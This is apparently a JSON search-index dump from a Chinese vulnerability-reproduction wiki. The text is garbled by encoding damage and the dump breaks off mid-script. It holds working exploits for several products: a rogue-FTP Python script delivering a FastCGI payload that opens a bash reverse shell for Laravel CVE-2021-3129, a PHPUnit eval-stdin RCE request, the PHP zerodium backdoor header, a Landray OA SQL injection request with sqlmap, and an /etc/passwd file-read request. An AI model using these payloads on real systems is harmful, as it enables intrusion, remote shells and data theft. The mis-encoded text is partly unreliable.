Ê†πÊçÆË∑ØÂæÑÂØÜÁ†Å‰ΩøÁî®Âì•ÊñØÊãâËøûÊé•Êú®È©¨ FTPËÑöÊú¨ # -*- coding: utf-8 -*- # @Time : 2021/1/13 6:56 ‰∏ãÂçà # @Author : tntaxin # @File : ftp_redirect.py # @Software: import socket from urllib.parse import unquote # ÂØπgopherusÁîüÊàêÁöÑpayloadËøõË°å‰∏ÄÊ¨°urldecode payload = unquote(\"%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/xxx.xxx.xxx.xxx/9999%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\") payload = payload.encode('utf-8') host = '0.0.0.0' port = 23 sk = socket.socket() sk.bind((host, port)) sk.listen(5) # ftpË¢´Âä®Ê®°ÂºèÁöÑpassvie port,ÁõëÂê¨Âà∞1234 sk2 = socket.socket() sk2.bind((host, 1234)) sk2.listen() # ËÆ°Êï∞Âô®ÔºåÁî®‰∫éÂå∫ÂàÜÊòØÁ¨¨Âá†Ê¨°ftpËøûÊé• count = 1 while 1: conn, address = sk.accept() conn.send(b\"200 \\n\") print(conn.recv(20)) # USER aaa\\r\\n ÂÆ¢Êà∑Á´Ø‰º†Êù•Áî®Êà∑Âêç if count == 1: conn.send(b\"220 ready\\n\") else: conn.send(b\"200 ready\\n\") print(conn.recv(20)) # TYPE I\\r\\n ÂÆ¢Êà∑Á´ØÂëäËØâÊúçÂä°Á´Ø‰ª•‰ªÄ‰πàÊ†ºÂºè‰º†ËæìÊï∞ÊçÆÔºåTYPE IË°®Á§∫‰∫åËøõÂà∂Ôºå TYPE AË°®Á§∫ÊñáÊú¨ if count == 1: conn.send(b\"215 \\n\") else: conn.send(b\"200 \\n\") print(conn.recv(20)) # SIZE /123\\r\\n ÂÆ¢Êà∑Á´ØËØ¢ÈóÆÊñá‰ª∂/123ÁöÑÂ§ßÂ∞è if count == 1: conn.send(b\"213 3 \\n\") else: conn.send(b\"300 \\n\") print(conn.recv(20)) # EPSV\\r\\n' conn.send(b\"200 \\n\") print(conn.recv(20)) # PASV\\r\\n ÂÆ¢Êà∑Á´ØÂëäËØâÊúçÂä°Á´ØËøõÂÖ•Ë¢´Âä®ËøûÊé•Ê®°Âºè if count == 1: conn.send(b\"227 127,0,0,1,4,210\\n\") # ÊúçÂä°Á´ØÂëäËØâÂÆ¢Êà∑Á´ØÈúÄË¶ÅÂà∞Âì™‰∏™ip:portÂéªËé∑ÂèñÊï∞ÊçÆ,ip,portÈÉΩÊòØÁî®ÈÄóÂè∑ÈöîÂºÄÔºåÂÖ∂‰∏≠Á´ØÂè£ÁöÑËÆ°ÁÆóËßÑÂàô‰∏∫Ôºö4*256+210=1234 else: conn.send(b\"227 127,0,0,1,35,40\\n\") # Á´ØÂè£ËÆ°ÁÆóËßÑÂàôÔºö35*256+40=9000 print(conn.recv(20)) # Á¨¨‰∏ÄÊ¨°ËøûÊé•‰ºöÊî∂Âà∞ÂëΩ‰ª§RETR /123\\r\\nÔºåÁ¨¨‰∫åÊ¨°ËøûÊé•‰ºöÊî∂Âà∞STOR /123\\r\\n if count == 1: conn.send(b\"125 \\n\") # ÂëäËØâÂÆ¢Êà∑Á´ØÂèØ‰ª•ÂºÄÂßãÊï∞ÊçÆÈìæÊé•‰∫Ü # Êñ∞Âª∫‰∏Ä‰∏™socketÁªôÊúçÂä°Á´ØËøîÂõûÊàë‰ª¨ÁöÑpayload print(\"Âª∫Á´ãËøûÊé•!\") conn2, address2 = sk2.accept() conn2.send(payload) conn2.close() print(\"Êñ≠ÂºÄËøûÊé•!\") else: conn.send(b\"150 \\n\") print(conn.recv(20)) exit() # Á¨¨‰∏ÄÊ¨°ËøûÊé•ÊòØ‰∏ãËΩΩÊñá‰ª∂ÔºåÈúÄË¶ÅÂëäËØâÂÆ¢Êà∑Á´Ø‰∏ãËΩΩÂ∑≤ÁªèÁªìÊùü if count == 1: conn.send(b\"226 \\n\") conn.close() count += 1 ÂèÇËÄÉÊñáÁ´† Á±≥ÊñØÁâπÂõ¢Èòü|ÊºèÊ¥ûÂàÜÊûê | Laravel DebugÈ°µÈù¢RCEÔºàCVE-2021-3129ÔºâÂàÜÊûêÂ§çÁé∞ ÈôåÈôåÂÆâÂÖ®|FTPÂà©Áî®|LARAVELÁöÑÈÇ£‰∏™RCEÊúÄÊúâË∂£ÁöÑÁÇπÂú®ËøôÈáå Âéü‰ΩúËÄÖÊºèÊ¥ûÂàÜÊûê Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/jQuery/":{"url":"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/jQuery/","title":"jQuery","keywords":"","body":"jQuery jQuery XSSÊºèÊ¥û CVE-2020-11022/11023 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/jQuery/jQuery XSSÊºèÊ¥û CVE-2020-11022 11023.html":{"url":"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/jQuery/jQuery XSSÊºèÊ¥û CVE-2020-11022 11023.html","title":"jQuery XSSÊºèÊ¥û CVE-2020-11022/11023","keywords":"","body":"jQuery XSSÊºèÊ¥û CVE-2020-11022/11023 ÊºèÊ¥ûÊèèËø∞ ÊçÆNVDÊèèËø∞ÔºöÂú®Â§ß‰∫éÊàñÁ≠â‰∫é1.2‰∏îÂú®3.5.0‰πãÂâçÁöÑjQueryÁâàÊú¨‰∏≠ÔºåÂç≥‰ΩøÊâßË°å‰∫ÜÊ∂àÊØíÔºàsanitizeÔºâÂ§ÑÁêÜÔºå‰πü‰ªç‰ºöÊâßË°åÂ∞ÜÊù•Ëá™‰∏çÂèó‰ø°‰ªªÊù•Ê∫êÁöÑHTML‰º†ÈÄíÁªôjQueryÁöÑDOMÊìç‰ΩúÊñπÊ≥ïÔºàÂç≥html()„ÄÅ.append()Á≠âÔºâÔºå‰ªéËÄåÂØºËá¥xssÊºèÊ¥û„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] 3.5.0 > jQuery >= 1.2 ÊºèÊ¥ûÂ§çÁé∞ Âú®Á∫øÂ§çÁé∞Âú∞ÂùÄÔºå ÂèØ‰ª•ÈÄöËøáËßÇÂØüÂèòÂåñ‰∫ÜËß£ÊºèÊ¥û https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html PoC 1. PoC 2. (Only jQuery 3.x affected) \"> PoC 3. PoC 1ÂíåPoC 2ÂÖ∑ÊúâÁõ∏ÂêåÁöÑÊ†πÊú¨ÂéüÂõ†„ÄÇÂú®‰∏≠.html()Ôºå‰Ωú‰∏∫ÂèÇÊï∞‰º†ÈÄíÁöÑHTMLÂ≠óÁ¨¶‰∏≤Â∞Ü‰º†ÈÄíÂà∞ $ .htmlPrefilterÔºàÔºâÊñπÊ≥ï„ÄÇËØ•htmlPrefilterÂ§ÑÁêÜÁî®‰∫éÊõøÊç¢Ëá™Èó≠ÂêàÊ†áÁ≠æÁ≠âËøõË°åÂà∞ÔºåÈÄöËøá‰ΩøÁî®‰ª•‰∏ãÊ≠£ÂàôË°®ËææÂºèÔºö**`` rxhtmlTag = / ] *Ôºâ\\ /> / gi [„ÄÇ ..] htmlPrefilterÔºöfunctionÔºàhtmlÔºâ{ return html.replaceÔºàrxhtmlTagÔºå‚Äú ‚ÄùÔºâ; } Â¶ÇÊûúPoC 1ÁöÑHTMLÈÄöËøáÊ≠§ÊõøÊç¢ÔºåÂàôËæìÂá∫Â∞ÜÊòØÔºö > $ .htmlPrefilterÔºà' 'Ôºâ ‚Äú ÈªÑËâ≤ÈÉ®ÂàÜÊòØÊõøÊç¢ÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇÁî±‰∫éÊ≠§ÊõøÊç¢ÔºåÊ†∑ÂºèÂÖÉÁ¥†ÂÜÖÈÉ®Ë¢´ÊõøÊç¢‰∏∫ÔºåÁªìÊûúÊòØÔºå‰πãÂêéÁöÑÂ≠óÁ¨¶‰∏≤‰ªéÊ†∑ÂºèÂÖÉÁ¥†‰∏≠Ë¢´Ë∏¢Âá∫„ÄÇ‰πãÂêéÔºå.html()Â∞ÜÊõøÊç¢ÁöÑHTMLÂàÜÈÖçÁªôinnerHTML„ÄÇÂú®ËøôÈáåÔºåÂ≠óÁ¨¶‰∏≤ÂèòÊàê‰∫ÜÂÆûÈôÖÁöÑimgÊ†áÁ≠æÔºåÂπ∂Ëß¶Âèë‰∫Üonerror‰∫ã‰ª∂„ÄÇ È°∫‰æøËØ¥‰∏Ä‰∏ãÔºå‰∏äËø∞Ê≠£ÂàôË°®ËææÂºèÂú®3.x‰πãÂâçÁöÑjQuery‰∏≠‰ΩøÁî®„ÄÇ‰ªé3.xÂºÄÂßãÔºå‰ΩøÁî®‰∫ÜÂè¶‰∏Ä‰∏™ÁªèËøáÁ®çÂä†‰øÆÊîπÁöÑÊ≠£ÂàôË°®ËææÂºè rxhtmlTag = / \\ x20 \\ t \\ r \\ n \\ f] *Ôºâ[^>] *Ôºâ\\ /> / gi Ê≠§Êõ¥ÊîπÂºïÂÖ•‰∫ÜÂè¶‰∏Ä‰∏™XSSÂêëÈáèÔºåËØ•ÂêëÈáèÂèØËÉΩ‰ªÖÁî±Êõ¥Â§öÂü∫Êú¨ÂÖÉÁ¥†ÂíåÂ±ûÊÄßÂØºËá¥XSS„ÄÇÈÄöËøáÊ≠§Êõ¥ÊîπÂºïÂÖ•‰∫ÜPoC 2ÁöÑÂêëÈáè„ÄÇÂÆÉ‰ªÖÈÄÇÁî®‰∫éjQuery3.x„ÄÇ > $ .htmlPrefilterÔºà' ‚Äù>'Ôºâ ‚Äù>‚Äú Âú®ËøôÁßçÊÉÖÂÜµ‰∏ãÔºåÂ±ûÊÄßÂÄº‰∏äÁöÑ img Â≠óÁ¨¶‰∏≤Ë¢´Ë∏¢Âá∫Âπ∂ÂèëÁîüXSS„ÄÇ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/PHPUnit/":{"url":"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/PHPUnit/","title":"PHPUnit","keywords":"","body":"PHPUnit PHPUnit eval-stdin.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2017-9841 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/PHPUnit/PHPUnit eval-stdin.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2017-9841.html":{"url":"book/ÂºÄÂèëÊ°ÜÊû∂ÊºèÊ¥û/PHPUnit/PHPUnit eval-stdin.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2017-9841.html","title":"PHPUnit eval-stdin.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2017-9841","keywords":"","body":"PHPUnit eval-stdin.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û CVE-2017-9841 ÊºèÊ¥ûÊèèËø∞ PHPUnit5.6.3‰πãÂâçÁöÑÁâàÊú¨ÔºåÂ≠òÂú®‰∏ÄÂ§ÑËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÔºåÂà©Áî®ÊºèÊ¥ûÂèØ‰ª•Ëé∑ÂèñÊúçÂä°Âô®ÊïèÊÑü‰ø°ÊÅØÂèäÊùÉÈôê„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] PHPUnit ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥û‰Ωç‰∫é /phpunit/src/Util/PHP/eval-stdin.php ÂÖ∂‰∏≠ÂÖ≥ÈîÆ‰ª£Á†Å‰∏∫: eval('?>'.file_get_contents('php://input')); ÂèëÈÄÅÂ¶Ç‰∏ãËØ∑Ê±ÇÂåÖÊâßË°åPHP‰ª£Á†Å POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1 Host: Content-Length: 21 Accept-Encoding: gzip Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÂºÄÂèëËØ≠Ë®ÄÊºèÊ¥û/":{"url":"book/ÂºÄÂèëËØ≠Ë®ÄÊºèÊ¥û/","title":"ÂºÄÂèëËØ≠Ë®ÄÊºèÊ¥û","keywords":"","body":"ÂºÄÂèëËØ≠Ë®ÄÊºèÊ¥ûüê≠ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÂºÄÂèëËØ≠Ë®ÄÊºèÊ¥û/PHP/":{"url":"book/ÂºÄÂèëËØ≠Ë®ÄÊºèÊ¥û/PHP/","title":"PHP","keywords":"","body":"PHP PHP zerodiumÂêéÈó®ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÂºÄÂèëËØ≠Ë®ÄÊºèÊ¥û/PHP/PHP zerodiumÂêéÈó®ÊºèÊ¥û.html":{"url":"book/ÂºÄÂèëËØ≠Ë®ÄÊºèÊ¥û/PHP/PHP zerodiumÂêéÈó®ÊºèÊ¥û.html","title":"PHP zerodiumÂêéÈó®ÊºèÊ¥û","keywords":"","body":"PHP zerodiumÂêéÈó®ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ PHPÂºÄÂèëÂ∑•Á®ãÂ∏àJake BirchallÂú®ÂØπÂÖ∂‰∏≠‰∏Ä‰∏™ÊÅ∂ÊÑèCOMMITÁöÑÂàÜÊûêËøáÁ®ã‰∏≠ÂèëÁé∞ÔºåÂú®‰ª£Á†Å‰∏≠Ê≥®ÂÖ•ÁöÑÂêéÈó®ÊòØÊù•Ëá™‰∏Ä‰∏™PHP‰ª£Á†ÅË¢´Âä´ÊåÅÁöÑÁΩëÁ´ô‰∏äÔºåÂπ∂‰∏îÈááÁî®‰∫ÜËøúÁ®ã‰ª£Á†ÅÊâßË°åÁöÑÊìç‰ΩúÔºåÂπ∂‰∏îÊîªÂáªËÄÖÁõóÁî®‰∫ÜPHPÂºÄÂèë‰∫∫ÂëòÁöÑÂêç‰πâÊù•Êèê‰∫§Ê≠§COMMIT„ÄÇ ÁõÆÂâç‰∏∫Ê≠¢PHPÂÆòÊñπÂπ∂Êú™Â∞±ËØ•‰∫ã‰ª∂ËøõË°åÊõ¥Â§öÊä´Èú≤ÔºåË°®Á§∫Ê≠§Ê¨°ÊúçÂä°Âô®Ë¢´ÈªëÁöÑÂÖ∑‰ΩìÁªÜËäÇ‰ªçÂú®Ë∞ÉÊü•ÂΩì‰∏≠„ÄÇÁî±‰∫éÊ≠§‰∫ã‰ª∂ÁöÑÂΩ±ÂìçÔºåPHPÁöÑÂÆòÊñπ‰ª£Á†ÅÂ∫ìÂ∑≤ÁªèË¢´Áª¥Êä§‰∫∫ÂëòËøÅÁßªËá≥GitHubÂπ≥Âè∞Ôºå‰πãÂêéÁöÑÁõ∏ÂÖ≥‰ª£Á†ÅÊõ¥Êñ∞„ÄÅ‰øÆÊîπÂ∞Ü‰ºöÈÉΩÂú®GitHub‰∏äËøõË°å„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] PHP 8.1.0-dev FOFA [!NOTE] \"PHP/8.1.0-dev\" ÊºèÊ¥ûÂ§çÁé∞ ÂêéÈó®‰∏∫Ê∑ªÂä†ËØ∑Ê±ÇÂ§¥ User-Agentt: zerodiumsystem('id'); [!NOTE] ÊòØ User-Agentt ‰∏çÊòØ User-Agent ÂèçÂºπshell Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/","title":"OA‰∫ßÂìÅÊºèÊ¥û","keywords":"","body":"OA‰∫ßÂìÅÊºèÊ¥ûüê∂ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ËìùÂáåOA/":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ËìùÂáåOA/","title":"ËìùÂáåOA","keywords":"","body":"ËìùÂáåOA ËìùÂáåOA EKP ÂêéÂè∞SQLÊ≥®ÂÖ•ÊºèÊ¥û CNVD-2021-01363 ËìùÂáåOA ‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÊºèÊ¥û ËìùÂáåOA custom.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ËìùÂáåOA SSRF+JNDIËøúÁ®ãÂëΩ‰ª§ÊâßË°å Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ËìùÂáåOA/ËìùÂáåOA EKP ÂêéÂè∞SQLÊ≥®ÂÖ•ÊºèÊ¥û CNVD-2021-01363.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ËìùÂáåOA/ËìùÂáåOA EKP ÂêéÂè∞SQLÊ≥®ÂÖ•ÊºèÊ¥û CNVD-2021-01363.html","title":"ËìùÂáåOA EKP ÂêéÂè∞SQLÊ≥®ÂÖ•ÊºèÊ¥û CNVD-2021-01363","keywords":"","body":"ËìùÂáåOA EKP ÂêéÂè∞SQLÊ≥®ÂÖ•ÊºèÊ¥û CNVD-2021-01363 ÊºèÊ¥ûÊèèËø∞ Ê∑±Âú≥Â∏ÇËìùÂáåËΩØ‰ª∂ËÇ°‰ªΩÊúâÈôêÂÖ¨Âè∏Êï∞Â≠óOA(EKP)Â≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇÊîªÂáªËÄÖÂèØÂà©Áî®ÊºèÊ¥ûËé∑ÂèñÊï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØ„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÊµãËØïÊó∂Èó¥ 2021-3-24 ÂâçÁâàÊú¨ ÊºèÊ¥ûÂ§çÁé∞ Â≠òÂú®SQLÊ≥®ÂÖ•ÁöÑ Url‰∏∫,ËøôÈáåÊãøÂÆòÊñπÁöÑÊºîÁ§∫Á´ôÁÇπÊºîÁ§∫ÊºèÊ¥ûËøáÁ®ã https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true ÂÖ∂‰∏≠Â≠òÂú®SQLÊ≥®ÂÖ•ÁöÑÂèÇÊï∞‰∏∫ ordeby Ôºå Êï∞ÊçÆÂåÖÂ¶Ç‰∏ã GET /km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Pragma: no-cache Cache-Control: no-cache sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: cross-site Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943d; landray_danyuan=null; landray_guanjianci=null; landray_sorce=baidupinzhuanwy; landray_jihua=null; JSESSIONID=232B6933CF33B5422F9D2649739D48FE; Hm_lvt_223eecc93377a093d4111a2d7ea28f51=1616509114,1616566341,1616566350; Hm_lpvt_223eecc93377a093d4111a2d7ea28f51=1616566350; Hm_lvt_d14cb406f01f8101884d7cf81981d8bb=1616509114,1616566341,1616566350; Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb=1616566507; Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616566507; Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab=1616566507; fd_name=%E5%95%8A%E7%9A%84%E5%93%88; fd_id=1785f817dd0f5a4beaa482646cb9a2d8; nc_phone=15572002383; j_lang=zh-CN; LtpaToken=AAECAzYwNUFEOEZBNjA1QjgxQkFsdW9stJ5e1pcW1hgQi3cOa0iEyAhdZZs=; Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b=1616510026,1616566523; Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b=1616566523; add_customer=0 ‰øùÂ≠ò‰∏∫Êñá‰ª∂Ôºå‰ΩøÁî® Sqlmap Ë∑ë‰∏Ä‰∏ãÊ≥®ÂÖ• sqlmap -r sql.txt -p orderby --dbs ÊÑüË∞¢ÂêçÂçï ÊÑüË∞¢ @Mia√≤a Â∏àÂÇÖÁöÑÊäïÁ®ø Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ËìùÂáåOA/ËìùÂáåOA ‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ËìùÂáåOA/ËìùÂáåOA ‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÊºèÊ¥û.html","title":"ËìùÂáåOA ‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÊºèÊ¥û","keywords":"","body":"ËìùÂáåOA ‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ËìùÂáåOA Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ª•‰∏ä‰º†ÊÅ∂ÊÑèÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ËìùÂáåOA ÊºèÊ¥ûÂ§çÁé∞ /sys/search/sys_search_main/sysSearchMain.do?method=editParam&fdParemNames=11&FdParameters=[shellcode] ÊºèÊ¥ûÂú®/sys/search/sys_search_main/sysSearchMain.do method ‰∏∫ editrParam„ÄÇÂèÇÊï∞‰∏∫ FdParametersÔºåÂú® com.landray.kmss.sys.search.jar ‰∏≠ÁöÑ com.landray.kmss.sys.search.actions.SysSearchMainAction Á±ª„ÄÇmethod ‰∏∫ editrParam„ÄÇ ÂØπ fdParemNames ÁöÑÂÜÖÂÆπËøõË°å‰∫ÜÂà§Á©∫„ÄÇÂ¶ÇÊûú‰∏ç‰∏∫Á©∫,ËøõÂÖ• SysSearchDictUtil.getParamConditionEntry ÊñπÊ≥ï„ÄÇ ‰πüÊòØÂØπ fdParemNames ËøõË°å‰∫Ü‰∏ÄÊ¨°Âà§Á©∫„ÄÇÁÑ∂Âêé‰º†ÂÖ• ObjectXML.objectXMLDecoderByString ÊñπÊ≥ï„ÄÇ Â∞Ü‰º†ÂÖ•ËøõÊù•ÁöÑ string Â≠óÁ¨¶ËøõË°åÊõøÊç¢„ÄÇÂ∞ÜÂÖ∂ËΩΩÂÖ•Â≠óËäÇÊï∞ÁªÑÁºìÂÜ≤Âå∫ÔºåÂú®‰º†ÈÄíÁªô objectXmlDecoder„ÄÇ Âú® objectXmlDecoder ‰∏≠„ÄÇÂ∞±Êõ¥ÊòéÊòæ‰∫Ü„ÄÇÂÖ∏ÂûãÁöÑ xmlDecoder ÂèçÂ∫èÂàóÂåñ„ÄÇ Êï¥‰ΩìÊµÅÁ®ãÂè™ÂØπ FdParameters ÁöÑÂÜÖÂÆπËøõË°å‰∫Ü‰∏Ä‰∫õÂÜÖÂÆπÊõøÊç¢„ÄÇ ÂØºËá¥ xmlDecoder ÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇ Âà©Áî®ÊñπÂºèÔºö Xmldecoder payload ÁîüÊàê https://github.com/mhaskar/XMLDecoder-payload-gene... Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/OA‰∫ßÂìÅÊºèÊ¥û/ËìùÂáåOA/ËìùÂáåOA custom.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/OA‰∫ßÂìÅÊºèÊ¥û/ËìùÂáåOA/ËìùÂáåOA custom.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"ËìùÂáåOA custom.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"ËìùÂáåOA custom.jsp ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Ê∑±Âú≥Â∏ÇËìùÂáåËΩØ‰ª∂ËÇ°‰ªΩÊúâÈôêÂÖ¨Âè∏Êï∞Â≠óOA(EKP)Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û„ÄÇÊîªÂáªËÄÖÂèØÂà©Áî®ÊºèÊ¥ûËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ËìùÂáåOA FOFA [!NOTE] app=\"Landray-OAÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ Âá∫Áé∞ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ custom.jsp '> ËØ∑Ê±ÇÂåÖ‰∏∫ POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 42 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip var={\"body\":{\"file\":\"file:///etc/passwd\"}} ÊºèÊ¥ûPOC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ËìùÂáåOA ‰ªªÊÑèÊñá‰ª∂ËØªÂèñ \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx 